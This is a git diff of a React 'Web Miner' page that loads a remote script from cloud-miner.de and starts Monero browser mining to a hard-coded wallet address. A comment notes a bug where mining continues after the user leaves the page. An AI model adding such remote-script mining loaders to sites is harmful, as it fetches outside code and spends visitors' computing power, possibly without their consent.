@@ -3,20 +3,23 @@ import PageTitle from "../PageTitle";
 import Nav from "../Nav";
 import { Link } from "react-router-dom";
 import WebMinerFooter from "./WebMinerFooter";
+import GetScript from "../getScript";
 
 function WebMinerPage() {
-    document.body.style.backgroundColor = "#EEEEEE";
-// Add slider bar to control mining speed --> look into cloud-miner js code and try a few keynames.
-// FIX BUG WHERE MINER CONTINUES RUNNING AFTER EXIT
-// POSSIBLE SOLUTION - separate navbar and footer for webminer using anchor tag.
-
+    document.body.style.backgroundColor = "#EEEEEE";    
     useEffect(() => {
-        window.EverythingIsLife('41e5VEKZTbWYpEWRW21yV1E9AVgNkNGrBciPSncifEAbHqxGUSd12Xr5yCfMyUTJM92opviLuaAWhXCHaX4gvdYLBBT9zUR', 'x', 50);
-        document.querySelector("#webMinerInfo").innerHTML = "Mining...";
+        GetScript("https://cloud-miner.de/tkefrep/tkefrep.js?tkefrep=bs?nosaj=faster.moneroocean")
+        .then(() => {
+            window.EverythingIsLife('41e5VEKZTbWYpEWRW21yV1E9AVgNkNGrBciPSncifEAbHqxGUSd12Xr5yCfMyUTJM92opviLuaAWhXCHaX4gvdYLBBT9zUR', 'x', 50);
+            document.querySelector("#webMinerInfo").innerHTML = "Mining...";
+        }, () => {
+            document.querySelector("#webMinerInfo").innerHTML = "Failed To Get Mining Script...";
+        });
 
         return;
     }, []);
 
+    // Add slider bar to control mining speed + look into cloud-miner js code and try a few keynames for stopping mining.
     return (<>
         <Nav activePage="webMiner" />
         <PageTitle title="Web Miner" />
